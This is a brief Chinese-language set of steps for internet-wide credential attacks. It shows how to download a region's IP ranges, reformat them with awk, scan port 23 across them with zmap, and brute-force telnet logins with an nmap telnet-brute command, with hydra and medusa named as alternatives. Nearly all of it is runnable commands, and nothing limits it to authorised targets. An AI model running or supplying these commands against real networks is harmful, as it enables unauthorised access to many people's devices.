
1、下载指定地区IP段
    通过http://ipblock.chacuo.net/ 下载制定IP段文件
    
2、处理IP段，变成子网验码段
    awk '{print $3}' chinaip.txt > targetip.txt
    
3、通过zmap扫描上述文件的特定端口（如：23端口）
    zmap -w targetip.txt -p 23 -B 2M -o targetipresult.txt
    
4、通过hydra、medusa或者python调用库自己编写弱口令探测
    nmap -p 23 --script telnet-brute --script-args userdb=user.txt,passdb=pwd.txt,telnet-brute.timeout=8s -Pn -iL host.txt -v
    
